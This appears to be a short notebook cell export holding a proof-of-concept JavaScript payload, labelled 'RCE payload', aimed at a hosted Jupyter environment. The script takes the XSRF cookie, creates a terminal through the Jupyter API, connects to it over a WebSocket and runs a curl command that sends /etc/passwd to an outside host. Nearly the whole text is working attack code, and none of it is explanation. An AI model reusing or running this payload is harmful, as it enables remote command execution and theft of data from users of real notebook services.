# %%
# %%html
# <script>/* RCE payload */</script>
# Out:
# <script>
# function getCookie(name) {
#     var value = "; " + document.cookie;
#     var parts = value.split("; " + name + "=");
#     if (parts.length == 2) return parts.pop().split(";").shift();
#     return null;
# }
# var csrfToken = getCookie('_xsrf');
# var xhr = new XMLHttpRequest();
# xhr.open('POST', 'https://' + document.domain + '/studiolab/default/jupyter/api/terminals', true);
# xhr.setRequestHeader('Content-Type', 'application/json');
# if (csrfToken) xhr.setRequestHeader('X-XSRFToken', csrfToken);
# xhr.send(JSON.stringify({}));
# setTimeout(function() {
#     var ws = new WebSocket('wss://' + document.domain + '/studiolab/default/jupyter/terminals/websocket/1');
#     ws.onopen = function() {
#         setTimeout(function() {
#             ws.send('["stdin","curl -X POST -d \"$(cat /etc/passwd)\" https://poc.heli9.com/log.php \\r"]');
#         }, 2000);
#     };
# }, 1000);
# </script>
